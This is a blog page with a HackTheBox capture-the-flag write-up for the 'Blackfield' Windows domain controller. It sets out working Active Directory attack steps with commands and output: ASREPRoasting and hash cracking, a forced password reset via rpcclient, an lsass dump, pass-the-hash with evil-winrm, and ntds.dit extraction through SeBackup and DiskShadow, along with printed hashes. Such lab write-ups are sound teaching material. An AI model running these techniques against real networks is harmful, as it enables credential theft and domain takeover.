<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Blackfield | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,hard"><meta name=description content="Blackfield HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/blackfield/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/blackfield/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Blackfield "><meta property="og:description" content="Blackfield HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/blackfield/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-03T16:30:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png"><meta name=twitter:title content="Blackfield "><meta name=twitter:description content="Blackfield HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Blackfield ","item":"https://s4ch.github.io/writeups/hackthebox/blackfield/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Blackfield ","name":"Blackfield ","description":"Blackfield HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","hard"],"articleBody":"Information Name: Blackfield Profile: www.hackthebox.eu Difficulty: Hard OS: Windows Points: 40 Overview TL;DR:\nInstall tools used in this WU on BlackArch Linux:\n$ pacman -S nmap smbclient impacket python-pypykatz evil-winrm Network enumeration Port \u0026 service discovery with nmap:\n# Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.026s latency). Not shown: 65527 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r SF:(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver SF:sion\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h06m19s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-09-18T03:50:43 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds It seems we have here a domain controller with hostname DC01.\nEdit /etc/hosts to add the local domain:\n10.10.10.192 backfield.local SMB enumeration Let’s find some some shares:\n$ smbclient -L //10.10.10.192 Enter WORKGROUP\\cyfun's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share forensic Disk Forensic / Audit share. IPC$ IPC Remote IPC NETLOGON Disk Logon server share profiles$ Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available There are two non-default shares:\nforensic profiles$ One is not accessible but the other is:\n$ smbclient //10.10.10.192/forensic Enter WORKGROUP\\cyfun's password: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e ^C $ smbclient //10.10.10.192/profiles$ Enter WORKGROUP\\cyfun's password: Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Wed Jun 3 18:47:12 2020 .. D 0 Wed Jun 3 18:47:12 2020 AAlleni D 0 Wed Jun 3 18:47:11 2020 ABarteski D 0 Wed Jun 3 18:47:11 2020 ABekesz D 0 Wed Jun 3 18:47:11 2020 ABenzies D 0 Wed Jun 3 18:47:11 2020 ABiemiller D 0 Wed Jun 3 18:47:11 2020 AChampken D 0 Wed Jun 3 18:47:11 2020 ACheretei D 0 Wed Jun 3 18:47:11 2020 ... Those folders look like people’s profile, but there are three folders not starting with an uppercase letter that doesn’t look like a name.\naudit2020 support svc_backup We can save all profiles to a file:\n$ printf %s 'dir' | smbclient //10.10.10.192/profiles$ '' | sed '1,3d;$d' | cut -d ' ' -f 3 -s \u003e profiles.txt As we know from nmap that the is Kerberos running, let’s try ASREPRoast.\nThe ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).\nRef. HackTricks - ASREPRoast\nThen Impacket script GetNPUsers allow to check if Kerberos pre-auth is enabled for those accounts and extract their password hash:\n$ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) ... [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set ... [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set ... [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) Only support had is hash extracted.\n$ cat hash.txt $krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94 Now we can crack it with John the Ripper:\n$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl $ john hash.txt --show $krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight 1 password hash cracked, 0 left RPC enumeration We can know make use of the freshly discovered credentials to launch an authenticated RPC scan to find domain users.\n$ rpcclient -U support -W backfield.local 10.10.10.192 Enter BACKFIELD.LOCAL\\support's password: rpcclient $\u003e enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[audit2020] rid:[0x44f] user:[support] rid:[0x450] user:[BLACKFIELD764430] rid:[0x451] user:[BLACKFIELD538365] rid:[0x452] ... user:[BLACKFIELD438814] rid:[0x584] user:[svc_backup] rid:[0x585] user:[lydericlefebvre] rid:[0x586] We can see lydericlefebvre, a new account we didn’t see earlier.\nNow let’s list the domain groups:\n$ rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] Those are only default groups. Let’s check info about the special accounts we have.\n$ rpcclient $\u003e queryuser 0x586 User Name : lydericlefebvre Full Name : Lyd├⌐ric aas. Lefebvre Home Drive : Dir Drive : Profile Path: Logon Script: Description : @lydericlefebvre - VM Creator Workstations: Comment : Remote Dial : Logon Time : Thu, 01 Jan 1970 01:00:00 CET Logoff Time : Thu, 01 Jan 1970 01:00:00 CET Kickoff Time : Thu, 14 Sep 30828 04:48:05 CEST Password last set Time : Fri, 28 Feb 2020 23:33:36 CET Password can change Time : Sat, 29 Feb 2020 23:33:36 CET Password must change Time: Thu, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x586 group_rid: 0x201 acb_info : 0x00000210 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... I don’t know if this will be useful later but we now known that lydericlefebvre could be able to create VM. There was nothing special about the other accounts.\nPrivilege Escalation of Machine : from support to audit2020 In case our account is privileged we can try to change other account password. chgpasswd won’t help us as it requires the old password. But setuserinfo doesn’t.\nrpcclient $\u003e setuserinfo Usage: setuserinfo username level password [password_expired] result was NT_STATUS_INVALID_PARAMETER The level is defined from USER_INFORMATION_CLASS.\nrpcclient $\u003e setuserinfo audit2020 23 cyfun123! rpcclient $\u003e setuserinfo svc_backup 23 cyfun123! result: NT_STATUS_ACCESS_DENIED result was NT_STATUS_ACCESS_DENIED rpcclient $\u003e setuserinfo lydericlefebvre 23 cyfun123! result: NT_STATUS_ACCESS_DENIED result was NT_STATUS_ACCESS_DENIED Privilege Escalation of Machine : from audit2020 to svc_backup With support or unauthenticated we were not able to list the content of the forensic share but we can with audit2020. So let’s dump all we can:\n$ mkdir -p Shares/forensic $ cd Shares/forensic $ smbclient //10.10.10.192/forensic -U audit2020 -W blackfield.local cyfun123! Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Feb 23 14:03:16 2020 .. D 0 Sun Feb 23 14:03:16 2020 commands_output D 0 Sun Feb 23 19:14:37 2020 memory_analysis D 0 Thu May 28 22:28:33 2020 tools D 0 Sun Feb 23 14:39:08 2020 7846143 blocks of size 4096. 4156574 blocks available smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * PS: a more clever approach would be to avoid dumping tools/ which will take a lot of time and space for generic binaries we do not need.\nIn memory_analissy there is a lsass dump.\n$ cd memory_analysis $ unzip lsass.zip Archive: lsass.zip inflating: lsass.DMP Then we can use pypykatz, Python implementation of Mimikatz, to try to dump hashes from here.\n$ pypykatz lsa minidump lsass.DMP \u003e lsass_dump.txt INFO:root:Parsing file lsass.DMP So we obtained those two SHA1 hashes:\nsvc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c Administrator:db5c89a961644f0978b4b69a4d2a2239d7886368 And NT hashes:\nsvc_backup:9658d1d1dcd9250115e2205d9f48400d Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 We can use evil-winrm to make a pass the hash (PtH) authentication and gain PowerShell acess:\n$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e gc ../Desktop/user.txt 0d1d70d4c5439a332577fcbc2bcbed15 *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e Privilege Escalation of Machine : from svc_backup to root Let’s check what we can do with this account:\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e net user svc_backup User name svc_backup Full Name Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/23/2020 10:54:48 AM Password expires Never Password changeable 2/24/2020 10:54:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/20/2020 9:38:19 PM Logon hours allowed All Local Group Memberships *Backup Operators *Remote Management Use Global Group memberships *Domain Users The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Our account have way to much power!\nSeBackup \u0026 SeRestore privileges (from the Backup Operators group) allow us to set permissionand ownership on each file \u0026 folder.\nReferences:\nDiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018 show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019 Normally we shouldn’t be able to access ntds.dit (Active Directory database) but since SeBackup \u0026 SeRestore privileges let us set any permission on any file we will be able to fix that.\nLet’s auto-gives us full control on ntds.dit.\n$ntds_file = \"C:\\Windows\\NTDS\\ntds.dit\" $acl_ntds = Get-Acl $ntds_file $domain = \"blackfield.local\" $account = \"svc_backup\" $access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule(\"$domain\\$account\",\"FullControl\",\"Allow\") $acl_ntds.SetAccessRule($access_rule) $acl_ntds | Set-Acl $ntds_file Get-acl $ntds_file | select -expand accesstostring BLACKFIELD\\svc_backup Allow FullControl NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullContro Now we’ll use DiskShadow to make a shadow copy of the ntds.\nDiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.\nMicrosoft Docs\nLet’s prepapre the copy script (diskshadow.txt) to run DiskShadow in script mode.\nset context persistent nowriters# add volume c: alias cyfun# create# expose %cyfun% x:# exec \"cmd.exe\" /c copy x:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit# delete shadows volume %cyfun%# reset# Then we can use evil-winrm native upload feature.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e upload /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt to C:\\Users\\svc_backup\\Videos\\diskshadow.txt Data: 268 bytes of 268 bytes copied Info: Upload successful! And then call DiskShadow.\n*Evil-WinRM* PS C:\\Users\\svc_backup\u003e diskshadow.exe /s C:\\Users\\svc_backup\\Videos\\diskshadow.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 9/21/2020 12:12:50 AM -\u003e set context persistent nowriters -\u003e add volume c: alias cyfun -\u003e create Alias cyfun for shadow ID {eef6f0be-3c60-4e69-985d-3bc400a24ff1} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} set as environment variable. Querying all shadow copies with the shadow copy set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} * Shadow copy ID = {eef6f0be-3c60-4e69-985d-3bc400a24ff1} %cyfun% - Shadow copy set: {12b5d80f-4368-4727-a02b-1b22f5e020ef} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 9/21/2020 12:12:51 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u003e expose %cyfun% z: -\u003e %cyfun% = {eef6f0be-3c60-4e69-985d-3bc400a24ff1} The shadow copy was successfully exposed as z:\\. -\u003e exec \"cmd.exe\" /c copy z:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit The script file name is not valid. EXEC Execute a script file on the local machine. This command is used to duplicate or restore data as part of a backup or restore sequence. As I got issues with the exec command I manually copied the file afterward:\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e cp x:\\windows\\ntds\\ntds.dit . Then we can also dump the SYSTEM hive:\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e reg save hklm\\system system.hive Again, we can use evil-winrm native download feature.\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e download ntds.dit /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit Info: Downloading C:\\Users\\svc_backup\\Videos\\ntds.dit to /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit Info: Download successful! Finally we can use secretsdump from Impacket to extract the hashes.\n$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5::: support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: BLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: ... Again a PtH using evil-winrm with Administrator account.\n$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e gc ../Desktop/root.txt 511fa0e63117cc3e746a523d0b5fd0b8 ","wordCount":"2007","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png","datePublished":"2020-10-03T16:30:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/blackfield/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Blackfield</h1><div class=post-description>Blackfield HackTheBox writeup</div><div class=post-meta><span title='2020-10-03 16:30:00 +0000 UTC'>October 3, 2020</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2007 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png alt="Blackfield HackTheBox Machine"><p>Blackfield - Hard Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#smb-enumeration>SMB enumeration</a></li><li><a href=#rpc-enumeration>RPC enumeration</a></li><li><a href=#privilege-escalation-of-machine--from-support-to-audit2020>Privilege Escalation of Machine : from support to audit2020</a></li><li><a href=#privilege-escalation-of-machine--from-audit2020-to-svc_backup>Privilege Escalation of Machine : from audit2020 to svc_backup</a></li><li><a href=#privilege-escalation-of-machine--from-svc_backup-to-root>Privilege Escalation of Machine : from svc_backup to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Blackfield</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/255>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 40</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>:</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap smbclient impacket python-pypykatz evil-winrm
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with <a href=https://nmap.org/>nmap</a>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.026s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r
SF:(DNSVersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
SF:sion\x04bind\0\0\x10\0\x03&#34;);
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h06m19s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-09-18T03:50:43
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds
</code></pre><p>It seems we have here a domain controller with hostname DC01.</p><p>Edit <code>/etc/hosts</code> to add the local domain:</p><pre tabindex=0><code>10.10.10.192 backfield.local
</code></pre><h2 id=smb-enumeration>SMB enumeration<a hidden class=anchor aria-hidden=true href=#smb-enumeration>#</a></h2><p>Let&rsquo;s find some some shares:</p><pre tabindex=0><code>$ smbclient -L //10.10.10.192
Enter WORKGROUP\cyfun&#39;s password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
</code></pre><p>There are two non-default shares:</p><ul><li>forensic</li><li>profiles$</li></ul><p>One is not accessible but the other is:</p><pre tabindex=0><code>$ smbclient //10.10.10.192/forensic
Enter WORKGROUP\cyfun&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \&gt; ^C

$ smbclient //10.10.10.192/profiles$
Enter WORKGROUP\cyfun&#39;s password:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
  AChampken                           D        0  Wed Jun  3 18:47:11 2020
  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
...
</code></pre><p>Those folders look like people&rsquo;s profile, but there are three folders not
